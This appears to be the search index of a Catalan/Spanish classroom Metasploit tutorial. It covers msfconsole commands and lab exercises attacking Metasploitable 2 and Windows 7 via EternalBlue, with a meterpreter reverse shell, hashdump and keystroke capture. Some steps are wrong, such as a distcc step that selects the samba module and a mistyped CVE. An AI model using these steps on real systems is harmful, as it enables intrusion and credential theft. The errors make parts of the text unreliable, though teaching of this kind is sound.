{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"MeTaSPLoiT","text":"<p>Perill!</p> <p>No proveu a\u00e7\u00f2 fora d'\u00fan entorn did\u00e1ctic. Podria ser un delicte.</p>"},{"location":"#modulos","title":"M\u00d3DULOS","text":"<ul> <li>Auxiliary: Permite la interacci\u00f3n de herramientas externas como pueden ser:** Escaners de vulnerabilidades, Sniffers, etc... con el framework de Metasploit </li> <li>Encoders: Proporciona algoritmos par codificar y ofuscar los payloads que utilizaremos tras haber tenido \u00e9xito el exploit </li> <li>Exploits: Aqu\u00ed se encuentran todos los exploits disponibles en el \u201cframework\u201d para conseguir acceso a los diferentes SO\u2019s </li> <li>Payloads: Nos proporciona gran cantidad de c\u00f3digos \u201cmaliciosos\u201d que podremos ejecutar una vez haya tenido \u00e9xito el \u201cexploit\u201d </li> <li>Post: Nos proporciona funcionalidades para la fase de \u201cpost\u201d explotaci\u00f3n como recolecci\u00f3n de informaci\u00f3n, etc... </li> <li>Nops: Nos permite realizar u obtener operaciones NOP para evadir antivirus, IDS, etc... </li> </ul>"},{"location":"#estructura-de-directorios-importante","title":"Estructura de directorios (Importante)","text":"<p><code>Modules/exploits/&lt;OS/Platform&gt;/&lt;Protocol/Service/Local...&gt;/file.rb</code> </p>"},{"location":"#intro-a-metasploit-framework","title":"INTRO A METASPLOIT FRAMEWORK","text":"<ul> <li>Lanzamos la orden msfconsole desde el terminal que nos devolver\u00e1 el identificador msf &gt; para introducir las \u00f3rdenes.</li> <li>Previamente ser\u00e1 bueno actualizarlo: root@kali.~# msfupdate</li> <li>La consola MSF es como un mini-sistema de archivos donde las carpetas que cuelgan de \u00e9l se encuentran f\u00edsicamente en la ruta d\u00f3nde se ha instalado el framework. Ejemplos:<ul> <li>Los exploits de Windows esta en la ruta exploit/windows/&lt;..&gt;</li> <li>Los m\u00f3dulos auxiliares en auxiliary/&lt;...&gt;</li> <li>Los encoders en encoders/"},{"location":"#comandos-basicos","title":"COMANDOS B\u00c1SICOS","text":""},{"location":"#ordenes-de-ayuda","title":"\u00d3rdenes de ayuda","text":"<pre><code>* msf &gt; `help \u2013` lista las \u00f3rdenes separadas en dos listados:\n\n    * \u00d3rdenes del n\u00facleo de msf\n    * \u00d3rdenes de interacci\u00f3n con bases de datos.\n    * -h permite obtener informaci\u00f3n de \u00f3rdenes concretas.\n</code></pre>"},{"location":"#orden-de-busqueda","title":"Orden de b\u00fasqueda","text":"<ul> <li>msf &gt; <code>help \u2013</code> lista las \u00f3rdenes separadas en dos listados:<pre><code>* \u00d3rdenes del n\u00facleo de msf\n* \u00d3rdenes de interacci\u00f3n con bases de datos.\n* -h permite obtener informaci\u00f3n de \u00f3rdenes concretas.\n</code></pre> </li> </ul>"},{"location":"#orden-de-busqueda_1","title":"Orden de b\u00fasqueda","text":"<p>\u00datil para la b\u00fasqueda de m\u00f3dulos por alguna caracter\u00edstica o determinar si elframework esta actualizado.     * msf &gt; <code>search -h</code></p> <ul> <li>info \u2013 aporta informaci\u00f3n sobre el m\u00f3dulo seleccionado bien con la orden use (que permite seleccionar un m\u00f3dulo), bien especificando la ruta:<ul> <li>msf &gt; <code>use exploit/multi/handler</code></li> <li>msf &gt; <code>info</code></li> <li>msf &gt; <code>info &lt;ruta&gt;</code></li> </ul> </li> <li>show \u2013 muestra las diferentes opciones para los m\u00f3dulos del framework, exploits,payload, encoders, nops, etc.</li> </ul>"},{"location":"#ordenes-de-interaccion-y-configuracion","title":"\u00d3rdenes de interacci\u00f3n y configuraci\u00f3n","text":"<ul> <li>back \u2013 permite salir del m\u00f3dulo (contrario a use)</li> <li>set y setg \u2013 asignan valores a variables: set para un m\u00f3dulo, setg para en contexto del framework.</li> <li>unset y unsetg \u2013 desasignan valores a par\u00e1metros o variables</li> <li>connect \u2013 permite conectarnos a otra m\u00e1quina para su gesti\u00f3n o administraci\u00f3n dado la direcci\u00f3n IP y el puerto.</li> <li>irb \u2013 permite ejecutar un interprete de Ruby para el framework para ejercutar \u00f3rdenes y scripts.</li> <li>load, unload y loadpath \u2013 load/unload especifica el plugins a cargar/descargar, o directorio donde se almacenan (loadpath).</li> <li> <p>check \u2013 permite verificar si un sistema es vulnerable a cierta vulnerabilidad antes de lanzar el script.</p> </li> <li> <p>exploit \u2013 lanza el c\u00f3digo malicioso, una vez seleccionado y configurado el m\u00f3dulo, sobre la m\u00e1quina, o prepara el entorno para vulnerar la m\u00e1quina. Devuelve el control mediante un shell o un Meterpreter (Meta-interprete: payload que permite cargar e inyectar en un programa del sistema atacado las extensiones que hemos desarrollado en formato .dll).</p> </li> <li> <p>Opciones:         * -j ejecutar exploit en segundo plano         * -z no se interact\u00faa con la sesi\u00f3n tras explotaci\u00f3n exitosa         * -e lanza el paylod con la codificaci\u00f3n establecida</p> </li> <li>sessions \u2013 las shells obtenidas en sistemas vulnerados se organizan por sesiones. Esta orden permite ver las sesiones que tenemos abiertas:<ul> <li>-l lista sesiones disponibles</li> <li>-v muestra informaci\u00f3n extra</li> <li>-s script ejecuta script sobre todas las sesiones del Meterpreter</li> <li>-K finaliza todas las sesiones abiertas</li> <li>-c  ejecutar \u00f3rdenes sobre sesiones abiertas del meterpreter <li>-u permite actualizar la shell remota tipo Win32 a un meterpreter especificando la sesi\u00f3n.</li> <li>-i especifican sesi\u00f3n con la que interaccionar.</li> <li>resource \u2013 permite la carga de un archivo (.rc) con acciones especificas sobre el framework para automatizar tareas.</li> <li>makerc \u2013 almacena en un archivo el historial de \u00f3rdenes y acciones que se han realiza en la sesi\u00f3n en curso (nombre-usuario en el directorio .msfX)</li> <li>save \u2013 aporta persistencia a la configuraci\u00f3n del entorno, especialmente es test complicados y largos (archivo config en .msfX).</li> <li>jobs \u2013 muestra/finaliza los m\u00f3dulos en ejecuci\u00f3n en segundo plano</li> <li>run \u2013 permite ejecutar un m\u00f3dulo auxiliar cargado en el contexto de la consola.</li> <li>route \u2013 enruta sockets a sesiones (similar al route de Linux). \u00datil en pivoting</li>"},{"location":"about/","title":"About","text":""},{"location":"about/#practica-realitzada-per","title":"Pr\u00e0ctica realitzada per:","text":""},{"location":"about/#pepe-devesa","title":"Pepe Devesa","text":"<p>Anotaci\u00f3</p> <p>Esta part si que la podeu provar a casa.</p> <p>Compte!</p> <p>Aneu amb compte al realitzar esta part.</p> <p>Perill!!</p> <p>No proveu a\u00e7\u00f2 a casa.</p>"},{"location":"tema1/exemple1/","title":"Exemple Linux","text":""},{"location":"tema1/exemple1/#en-aesta-practica-prepararem-la-maquina-metasploitable-2-linux-per-a-poder-realitzar-algunes-activitats-amb-metasploit-amb-posterioritat","title":"En aesta pr\u00e0ctica prepararem la m\u00e0quina <code>metasploitable 2 (linux)</code> per a poder realitzar algunes activitats amb Metasploit amb posterioritat.","text":"<p>Perill!!</p> <p>No proveu a\u00e7\u00f2 fora d'un entorn did\u00e1ctic. Podrieu cometrer un delicte...</p> <p>1 Inicia les m\u00e0quines <code>Kali Linux</code> i <code>Metasploitable 2</code>. Ha d'haver-hi comunicaci\u00f3 per xarxa local entre ambdues. </p> <p>Anotaci\u00f3</p> <p>Tots els passos a realitzar es faran des de la m\u00e0quina Kali. S'intentar\u00e0 accedir a la m\u00e0quina Metasploitable mitjan\u00e7ant una vulnerabilitat del dimoni distcc.  distcc \u00e9s un compilador del llenguatge C i C++ pensat en l'aprofitament de m\u00e0quines distribu\u00efdes en la mateixa xarxa local per a optimitzar els temps de compilaci\u00f3 utilitzant el temps de CPU d'altres m\u00e0quines que estan ocioses.</p> <p>Kali: B\u00fasqueda del m\u00f3dulo a utilizar con metasploit:</p> <pre><code>search distcc\nSelecciona el texto \"exploit/unix/misc/distcc_exec\"\n</code></pre> <p></p> <p>Kali: Selecciona'l:</p> <pre><code>use exploit/multi/samba/usermap_script\n</code></pre> <p></p> <p>Kali: Selecciona el payload a utilitzar:</p> <pre><code>show payloads\nset payload cmd/unix/bind_ruby\n</code></pre> <p></p> <p>Instructions:</p> <pre><code>show options\nset RHOSTS 10.0.2.5\n(Modifica 10.0.2.5 per la IP de la m\u00e0quina a atacar)\n</code></pre> <p></p> <pre><code>Kali: Executeu l'exploit:\n\nexploit\nA partir d'ara hem obtingut una terminal en la m\u00e0quina atacada.\n</code></pre> <p></p>"},{"location":"tema1/exemple2/","title":"Exemple Windows","text":""},{"location":"tema1/exemple2/#en-aesta-practica-prepararem-la-maquina-windows-7-per-a-poder-realitzar-algunes-activitats-amb-metasploit","title":"En aesta pr\u00e0ctica prepararem la m\u00e0quina <code>Windows 7</code> per a poder realitzar algunes activitats amb Metasploit.","text":"<p>Perill!!</p> <p>No proveu a\u00e7\u00f2 fora d'un entorn did\u00e1ctic. Podrieu cometrer un delicte...</p>"},{"location":"tema1/exemple2/#explotar-vulnerabilitat-cve-2017-010-amb-eternalblue-i-doublepulsar-des-de-metasploit","title":"Explotar vulnerabilitat <code>CVE-2017-010</code> amb Eternalblue i Doublepulsar des de Metasploit","text":"<ul> <li>Simplement utilitzem el seg\u00fcent exploit:</li> </ul> <p><code>use exploit/windows/smb/ms17_010_eternalblue</code>...i ens torna el control mitjan\u00e7ant un shell o un Meterpreter (Metainterprete:payload que permet carregar i injectar en un programa del sistema atacat les extensions que em desenvolupat en format .dll). </p> <ul> <li>i payload <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></li> </ul> <p>Ja estem dins...</p> <ul> <li>Comandaments <ul> <li>sysinfo</li> <li>pwd</li> <li>getuid</li> <li>migrate pid </li> <li>getsystem</li> <li>hashdump -&gt; crackstation(desxifra el md5)</li> <li>screenshot</li> <li>upload de kali a win7</li> <li>download de W7 a Kali</li> <li>keyscan_start keyscan_dump</li> </ul> </li> </ul>"}]}